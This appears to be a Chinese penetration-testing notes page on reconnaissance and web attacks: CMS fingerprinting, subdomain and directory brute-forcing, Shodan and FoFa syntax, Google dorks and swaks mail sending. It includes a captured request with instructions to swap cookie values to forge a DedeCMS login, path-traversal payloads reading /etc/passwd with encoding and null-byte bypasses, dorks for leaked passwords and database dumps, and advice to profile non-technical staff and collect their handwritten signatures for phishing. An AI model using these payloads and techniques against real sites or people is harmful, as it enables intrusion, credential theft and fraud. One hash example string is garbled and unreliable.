User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://chengdabai.com/member/index_do.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: BAEID=E28656008B289085F974AEC4C2E8BCB2; PHPSESSID=l6nvnp8tuhopuhb4lqmsm1p3d0; last_vtime=1624856091; last_vtime__ckMd5=7821a05cb7b51465; last_vid=%E5%B0%8F%E7%99%BD%E5%93%A6%E5%93%A6; last_vid__ckMd5=091213a676d99a8b; DedeUserID=2149; DedeUserID__ckMd5=0216b45c77c3c31e; DedeLoginTime=1624864865; DedeLoginTime__ckMd5=14002567b9b563ed
Connection: close

替换此访问中DedeUserIDckMd5为刚刚抓包复制的last_vid__ckMd5的值，

并且替换DEdeUserID为你的用户名0001

## 学会用搜索引擎

(以下的baidu代表站点)
你搜索其标题还可以得到更多的信息
或者搜baidu
或者搜baidu php

## 源码层面收集

你可以在淘宝、闲鱼上购买源代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628153547271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
还可以去一些比如专门卖灰色源码的网站进行收集比如http://www.wayu.cn/muban/dedecms?v=free
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062813073986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)




### 响应头

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210626222906199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### CMS识别

常见的开源CMS有

```bash
Dedecms discuz phpcms wordpress zblog phpweb aspcms
```

**识别方法1：利用工具**
云悉指纹:需要邀请码，邀请流程繁琐不推荐
whatweb  http://whatweb.bugscaner.com/look/
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062722095483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

[ThreatScan在线获取网站的IP、指纹、中间件、操作系统等基础信息](https://scan.top15.cn/web/) 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623185322593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**识别方法2：观察网站信息**
查看网站的powered by.。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627224351107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
点击一个特别的文件名，在百度搜索名字有可能出
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627224732482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
进入一个特别的目录，报错可能会显示版本
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628123341487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

当你收集到CMS后，你应进行的下一步如百度 phpcms源码下载；PHPCMS漏洞，或者你还可以下载如 php_getshell.exe工具
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628124838142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


网上的公开cms识别原理是通过匹配识别的hash值字典匹配

### github监控

## 主动信息收集

*

1. 目标子域名

2. 目标APP资产
3. 目标域名备案信息
4. 目标微博，公众号信息
5. 目标邮箱用户信息
6. 目标VPN用户信息
7. 目标GitHub泄露信息
8. 目标服务器/中间件/CMS框架信息
9. 目标所有存活网站Waf信息
   10.目标网盘或第三方网盘敏感文件信息
10. 等等.....*

主动探测是与目标机器做交互。在做交互时不可避免会留下痕迹。如何隐藏自己请看技巧的代理小节

**CDN**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512005207488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


**网站使用说明书**

通常包含一些敏感信息，比如登录敏感目录，管理员默认密码，密码长度等

**查询公司APP**

* 七麦数据： https://www.qimai.cn/，可以查到企业下一些比较冷门的app。

**查询企业备案**
主要针对与国内网站备案。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630192550422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

站长之家 http://icp.chinaz.com
天眼查
ICP备案查询网

**操作系统识别**
**如果对方有网站**
Linux大小写敏感
Windows大小写不敏感
**没有网站，只有IP地址**
扫描工具，很多了如nmap

**js信息收集**
主要是爬取网站的敏感js文件，js中能收集到的信息:

* 增加攻击面(url、域名)
* 敏感信息(密码、API密钥、加密方式)
* 代码中的潜在危险函数操作
* 具有已知漏洞的框架

常用的工具
速度很快的jsfinder https://github.com/Threezh1/JSFinder

xray的rad爬虫 https://github.com/chaitin/rad

能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN

### 拓展信息收集

#### 子域名收集

**基础知识**
https://www.baidu.com
www 就是顶级域名，如果是https://blog.baidu.com就是他的子域名

##### 方法一：爆破子域名

>方法1：利用工具
>
>>[站长之家：在线子域名平台：](https://tool.chinaz.com/subdomain/)
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620184055217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

>>layer挖掘机使用简单，界面细致

>Sublist3r神器，Sublist3r神器集成了Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS等等，你值得拥有。Sublist3r是一个用Python编写的子域发现工具，旨在使用来自公共资源和暴力技术的数据枚举网站的子域。公共资源包括广泛的流行搜索引擎，如谷歌，雅虎，必应，百度，Ask以及Netcraft，Virustotal，ThreatCrowd，DNSdumpster和ReverseDNS，以发现子域名。或者，您也可以对给定域名强制执行子域，然后由名为Subbrute的集成工具处理。Subbrute是一个DNS元查询蜘蛛，它使用广泛的单词列表来枚举DNS记录和子域。此工具使用打开的解析器来避免限制问题，从而阻止Subbrute完成列表或尝试所有条目。

使用方法在kali上
git clone  https://gitee.com/ngadminq/Sublist3r.git
cd Sublist3r
pip install -r requirements.txt
python sublist3r.py -d example.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620195312656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

>>subDomainBurte 用小字典地柜的发现三、四、甚至五级等不容被检测的域名
>>DNSsdumpster网站.你要是懒得下载sublist3r做子域名检测，那么使用这个在线工具对你也类似，搜素出的结果是一样的
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620200656369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
>>搜索引擎：这种方法被很多人推荐，但是以下例子很清晰的看到这种方法获得的结果很杂乱
>>![sousuo](https://img-blog.csdnimg.cn/20210624183123142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630002712737.png)

##### 方法二：旁站搜集

https://scan.dyboy.cn/web/webside
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062319114246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 方法三：证书

**证书透明度**
这是一类证书，一个SSL/TLS证书通常包含子域名、邮箱地址。
https://crt.sh/（SSL证书查询）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620185251394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**防火墙检测**
hping3

**端口扫描**
在一个网站中可能存在同个网址，但是通过端口的不同，所显示的页面也不同。

常见端口攻击:https://www.cnblogs.com/botoo/p/10475402.html

**找后台页面**



### 获取路径

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070518210056.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705182427520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705182632316.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705182650246.png)

#### 目录爆破

扫描敏感文件
robots.txt
crossdomain.xml
sitemap.xml
xx.tar.gz
xx.bak
等
php文件夹遍历代码

##### 目录爆破经验

网上很多目录爆破只讲述了通过御剑或类似工具对URL进行拼接
还存在于网站中可访问本站资源的位置。比如图像。
有的站点资源目录不是使用..来回到上级，而是采用绝对路径。这明确的暴露了我们与根目录有多少层级可以通过转化相对路径来到达。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609114611136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
爆破目录后，只需要攻破爆破的目录就意味着你攻破了主目录。有时候有的目录与主目录代码架构完全不一样，这意味着你攻破的路径更宽。

##### 图像

简单的右键单击查看了它的显示图像作为查看图像。
调整您的 burp 套件以捕获正在进行的HTTP 请求并将其与Repeater共享
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604142648871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
在 GET 请求中，在上图中，您可以注意到filename=67.jpg，让我们尝试更改此文件名

```bash
filename=../../../etc/passwd

```

成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060414274930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 阻塞遍历序列

当你被阻塞时，可以尝试下面的：
当“../”被阻塞了。让我们尝试在没有任何前面的值的情况下输入/etc/passwd。

使用“双点加双斜杠”来操作 URL 文件名参数，即“ ….//….//….//etc/passwd”

在 ASCII 到 URL 编码器转换器的帮助下将“../”转换为“..%252f”和已成功访问密码文件`=..%252f..%252f..%252fetc/passwd`

许多开发人员在所需变量的末尾添加“.php”扩展名，然后再将其包含在内。
因此，网络服务器将/etc/passwd解释为/etc/passwd.php，因此我们无法访问该文件。为了摆脱这个“.php”，我们尝试使用空字节字符 (%00)终止变量，这将迫使 php 服务器在解释之后立即忽略所有内容。

#### 手工目录爆破

只需要记住
php 探针
在利用软件进行爆破前，你应该首先多对网站进行交互。

> ② 查看网站的图像、链接来自于站点的那些目录，有些目录也许能直接打开
> ③ 错误信息尝试：我在对一些网站故意输入错误信息时，它弹出来报错界面，而这个报错界面通常就包含它的目录。比如我尝试链接注入XSS语句，或我尝试空密码输入等

> url/login 的 login 换成reg、register、sign字段
> 查看robots.txt文件，对于一些简单的马大哈网站这个配置文件将会包含信息
> www.xxx.com/admin 加上/login.aspx(php)
> www.xxx.com 加上/static;/backup

再来看另一个案例：

#### 工具

**御剑后台扫描珍藏版**
御剑后台扫描珍藏版:用于爆破目录，同时通过爆破出来的目录就可以知道网站是什么语言写的比如/admin/login.aspx就是用aspx。

御剑后台扫描珍藏版下载网站](https://www.nnapp.cn/?post=211)；御剑55w增强版字典[文章有百度网盘链接](https://www.icode9.com/content-4-87412.html); 御剑85w 字典：http://www.coder100.com/index/index/content/id/833812

使用十分简单。但是我在对同一个站点进行扫描两次的时候，发现结果不一样，因为我网速不好，但采用了默认的中断时常3秒。但目录有限，四万多很多都是php文件路径，目录路径，如果你的电脑能受得了。可以选择........
更正：也可以是ip
![御剑](https://img-blog.csdnimg.cn/20210609115717971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名
**dirbuster**
kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入dirbuster，我认为该工具更强大，同样支持字典，还支持递归搜索和纯粹爆破，纯粹爆破你可以选择A-Z0-9a-z_，对于定向攻击来说纯粹爆破太强大了，直接帮助我发现隐藏各个目录,我在利用纯粹爆破将线程拉到50，仍旧需要10000+天以上（缺点是我用虚拟机跑的，字典大就慢）



**IP收集**
如果有DNS需设法进行绕过，如何绕过请看本文后面章节。最后，需要在网站中直接输入域名访问以证实真伪。
**C段**
简单来说就是不同服务器上的不同站点，网站搭建用不同的服务器搭建不同的站点，但都属于同一个站点，我们可以攻击其中一个网站，通过内网渗透从而获取其他网站的权限。

在线C段查询：https://chapangzhan.com/


**公司信息收集：招股书**
招股书涵盖的信息量很大，且容易获得，只需要用搜索引擎搜素：xxx招股书，即可获得。而其中许多公司得招股书中，**会有大量得资产域名**。在招股书中，其中目标公司股权结构也非常清晰。目标公司重要人员的其他重要信息也非常清晰：例如**手写签名：（用于后期钓鱼）**。
**例如注册商标：**（用户了解更多的目标资产与品牌）。**股权结构，需要重点关注，非技术类人员，**例如：销售，财务，后勤等职务的人员。此类人员是目标的重要人员，而且此类人员相对其他技术类人员安全意识较若，为“钓鱼”而铺垫。
查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。

**公司信息收集：人肉目标对象**
对目标人物初级收集通常要定在非技术人员，这类人员特征是在领英和脉脉上照片是西装。
般的大型内网渗透中，需要关注大致几个组
（1）IT组/研发组    他们掌握在大量的内网密码，数据库密码等。收集研发最好的入口点是他们运营的网站，网站中可能包含网站的开发、管理维护等人员的信息。
（2）秘书组     他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业务来确定渗透方向
（3）domain admins组  root/administrator
（4）财务组   他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组织的整体架构
（5）CXX组 ceo cto coo等，不同的目标组织名字不同，如部长，厂长，经理等。

通过领英和脉脉可以获得目标人物的姓名，邮箱，职务，手机，微信等等。

**企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，**

# 工具

工具这一部分除了参考我简介的基本规则，你最需要的是上手联系

## 字典
**fuzz**
参数Fuzz字典、Xss Fuzz字典、用户名字典、密码字典、目录字典、sql-fuzz字典、ssrf-fuzz字典、XXE字典、ctf字典、Api字典、路由器后台字典、文件后缀Fuzz、js文件字典、子域名字典，更新还挺及时的，最近关注此项目上一次更新在2021/6  https://github.com/TheKingOfDuck/fuzzDicts
## 学会上网
### google hack
1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件
2、intitle： 把网页标题中的某个字符作为搜索的条件
3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息
4、filetype/ext： 指定一个格式类型的文件作为搜索对象
5、inurl： 搜索包含指定字符的URL
6、site： 在指定的(域名)站点搜索相关内容　　
GoogleHacking其他语法
1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索
2、or 同时搜索两个或更多的关键字
3、link 搜索某个网站的链接 link:http://baidu.com即返回所有和baidu做了链接的URL
4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:
google-hacking-databaseGoogleHacking典型用法(特定资产的万能密码也要积累)

管理后台地址
inurl:"login"|inurl:"logon"|inurl:"admin"|inurl:"manage"|inurl:"manager"|inurl:"member"|inurl:"admin_login"|inurl:"ad_login"|inurl:"ad_manage"|inurl:"houtai"|inurl:"guanli"|inurl:"htdl"|inurl:"htgl"|inurl:"members"|inurl:"system"(|inurl:...) (-忽略的文件名)

错误消息

(site:域名) intext:"error"|intext:"warning"|intext:"for more information"|intext:"not found"|intext:"其他错误消息" (-排除的信息)

数据库的转储

(site:域名) # Dumping data for table(user|username|password|pass) (-排除的信息)


更多组合 我们可以把自己的搜索与能获取更好的结果的搜索项一起使用

1.当查找email时，能添加类似 通讯录 邮件 电子邮件 发送这种关键词

2.查找电话号码的时候可以使用一些类似 电话 移动电话 通讯录 数字 手机


用户名相关
(site:域名) intext:"username"|intext:"userid"|intext:"employee.ID"(|intext:...) "your username is" (-排除的信息)

密码相关

(site:域名) intext:"password"|intext:"passcode"(|intext:...) "your password is" "reminder forgotten" (-排除的信息)

公司相关

(site:域名) intext:"admin"|intext:"administrator"|intext:"contact your system"|intext:"contact your administrator" (-排除的信息)

web 服务器的软件错误消息

（site:域名）intitle:"Object not found!" "think this is a server error" (-排除的信息)

各种网络硬件设备

"Version Info" "BootVesion" "Internet Settings" 能找到 Belkin Cable/DSL路由器 ......
site:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录

```bash
site:"www.baidu.com" intitle:login intext:管理|后台|登录|用户名|密码|验证码|系统|账号|manage|admin|login|system
```

上传类漏洞地址

site:http://target.com inurl:file
site:http://target.com inurl:upload

注入页面

site:http://target.com inurl:php?id=
（批量注入工具、结合搜索引擎）


目录遍历漏洞
site:http://target.com intitle:index.of

SQL错误

site:http://target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:”Warning: mysql_query()" | intext:”Warning: pg_connect()"

phpinfo()

site:http://target.com ext:php intitle:phpinfo "published by the PHP Group"

配置文件泄露

```bash
site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini
```

数据库文件泄露

```bash
site:http://target.com ext:.sql | .dbf | .mdb | .db
```

日志文件泄露

```bash
site:http://target.com ext:.log
```

备份和历史文件泄露

```bash
site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar
```

公开文件泄露

```bash
site:http://target.com filetype:.doc .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv
```

邮箱信息

```bash
site:http://target.com intext:邮件 | email |@http://target.com 
```

社工信息

```bash
site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z
```
### 暗网

暗网下载链接，官方网址 https://www.torproject.org/zh-CN/download/   使用也很简单，我直接全点下一步安装，电脑挂上我的VPN，就可以轻松上网。

*待完善：暗网黑客资源*
### 空间搜索引擎

大多数空间搜索引擎爬虫相比于谷歌百度等都更及时和更深层，比如通常爬几分钟之前.使用的时候你应该将ip或url测试所有的空间搜索引擎工具，因为它得到的结果是不一样的。

#### Shodan

要收费，我在淘宝上买了别人的会员号，大概30多终身一个号。
 Shodan上搜索出来的可不是单纯的信息，而是所有接入互联网的设备！比如你的电脑、手机、摄像头甚至打印机。[官网地址](https://www.shodan.io)
 shodan可以搜索以下关键词：
 **摄像头**
网络摄像头 webcan、netcam

traffic signals

**路由器**
Ciso

**GPS**
GPS
**端口**
port:80/3389
port:80,21


hostname：　　搜索指定的主机或域名，例如 hostname:”google”
port：　　搜索指定的端口或服务，例如 port:”21”
country：　　搜索指定的国家，例如 country:”CN”
city：　　搜索指定的城市，例如 city:”Hefei”
org：　　搜索指定的组织或公司，例如 org:”google”
isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”
product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”
version：　　搜索指定的软件版本，例如 version:”1.6.2”
geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”
before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”
net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”


censys搜索引擎
censys搜索引擎功能与shodan类似，以下几个文档信息。
地址：https://www.censys.io/

https://www.censys.io/certificates/help 帮助文档
https://www.censys.io/ipv4?q=  ip查询
https://www.censys.io/domain?q=  域名查询
https://www.censys.io/certificates?q= 证书查询
搜索语法

默认情况下censys支全文检索。

23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not
80.http.get.status_code: 200　　指定状态
80.http.get.status_code:[200 TO 300]　　200-300之间的状态码
location.country_code: DE　　国家
protocols: (“23/telnet” or “21/ftp”)　　协议
tags: scada　　标签
80.http.get.headers.server：nginx　　服务器类型版本
autonomous_system.description: University　　系统描述
正则


#### 钟馗之眼

钟馗之眼搜索引擎偏向web应用层面的搜索。
地址：https://www.zoomeye.org/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701174924633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

搜索语法

app:nginx　　组件名
ver:1.0　　版本
os:windows　　操作系统
country:”China”　　国家
city:”hangzhou”　　城市
port:80　　端口
hostname:google　　主机名
site:thief.one　　网站域名
desc:nmask　　描述
keywords:nmask’blog　　关键词
service:ftp　　服务类型
ip:8.8.8.8　　ip地址
cidr:8.8.8.8/24　　ip地址段


#### FoFa搜索引擎

FoFa搜索引擎偏向资产搜索。
地址：https://fofa.so
语法不必特意去学，在访问界面中就有
当你在发现所寻找的正规网站，空间搜索引擎结果返回一些其他国家的网站，你不用太在意这种干扰，这是网站在做seo的结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630194435802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



#### Dnsdb搜索引擎

dnsdb搜索引擎是一款针对dns解析的查询平台。
地址：https://www.dnsdb.io/





## 邮件

### Swaks

Swaks是由John Jetmore编写和维护的一种功能强大，灵活，可脚本化，面向事务的SMTP测试工具。可向任意目标发送任意内容的邮件。 
“swaks”这个名字是”SWiss Army Knife Smtp”的首字母缩略词.
发布网站http://www.jetmore.org/john/code/swaks/ 
这个工具kali自带。

使用细节

```bash
    To:收件人
    From:发件人
    Subject:主题
    Date:日期
    Subject:标题
```

通常怎么使用

```bash
swaks --body "内容" --header "Subject:标题" -t xxxxx@qq.com -f "admin@local.com"
```

## 抓包

### 进程装包

  http://www.downcc.com/soft/11196.html
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625104540882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 手机抓包

直接抓apk数据包的软件是，漏了个大洞

打开模拟器或者是你真实的在手机上进行操作
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101138967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
对wifi进行设置
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101333315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
设置wifi与自己本机wifi相同
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101546129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101919134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

在burpsuite也做代理设置。burpsuite是一个专门抓web协议的数据流量软件。如果你在安卓模拟器随便打开一个app,当这个app涉及到请求网站时，这数据将会被抓取
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101801457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### 爬整个网站

**意义**
得到了是不是意味着免去了爆破网站、端口监测？

## HTTrack

HTTrack 是一个免费并易于使用的线下浏览器工具，全称是 HTTrack Website Copier for Windows，它能够让你从互联网上下载指定的网站进行线下浏览(离线浏览)，也可以用来收集信息(甚至有网站使用隐藏的密码文件)，一些仿真度极高的伪网站（为了骗取用户密码），也是使用类似工具做的。浏览线下站点和线上并没有什么不同。

## DNS信息收集

使用 Dig 执行 Zone Transfer 的结果与使用 NSLookup 的结果相同。两者之间的主要区别在于其输出的格式。在选择使用这两种工具中的哪一种时，取决于偏好和可用性
以下展示了DNS的正向查询与反向查询结果

### dig

执行反向 DNS 查找将 IP 地址转换为其主机名。为此，我们需要以相反的顺序写入 IP 地址（例如 192.168.1.1 将是 1.1.168.192），然后附加“.in-addr.arpa”。到它。接下来我们需要使用 DIG 查询 PTR 记录。让我们对 216.92.251.5 进行 DNS PTR 查询，这里的命令是“dig 5.251.92.216.in-addr.arpa PTR”

### nslookup

我们将介绍的第一个工具是 NSLookup，它使用语法“nslookup -option target”。如果要指定名称服务器，则需要将其添加到命令的末尾。语法是“nslookup -option target nameserver”。有关基本查询的示例，请参见图 3.1
![/](https://img-blog.csdnimg.cn/20210602183521855.png)
如您从这张图片中看到的，我们从我们执行的查询中只收到了一条记录。我们获得这个单一结果是因为我们没有指定查询类型。默认情况下，如果未指定查询类型，nslookup 将检索域的 A 记录。

要指定查询类型，您需要在命令中添加“-query=”选项。以下是您可以选择的查询类型列表。

NS：查询给定名称服务器的域 NS 记录
PTR：查询 IP 地址的反向查找（PTR 记录）
ANY：查询任何可用记录
AXFR：查询域的整个区域文件的给定名称服务器
MX：查询域的邮件服务器（MX 记录）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210612235509451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### hash相關工具

#### 识别

kali上有集成hashid。HashID 是由 psypanda 创建的用于替代 hash-identifier 的工具。HashID 可以使用正则表达式识别超过 210 种独特的哈希类型。此外，它可以识别单个散列、解析文件或读取目录中的文件以及其中的 id 散列。使用 hashid 的语法是“hashid 选项输入”。例如，如果您想确定散列的散列类型“2b4d9aa78976ec807986c1ea298d32418c85581b5625796c49bd6ecc146b1ef9”，则语法将是“hashid 2b4d9aa781986c59b48c5986c598c56c598c598c58c58c5986e8c88c868c868c568c868c568c868c568c868c568c568c568c568c56796c8625796c49bd6e
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602123135715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602123438725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
kali上还有类似的工具是Hash-identifier,但是功能没有这么强大。使用方法仍旧一样，但你仍需学会，因为针对一个hash值不同的工具识别结果可能会不一样。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602124320696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 破解

somd5

##### john

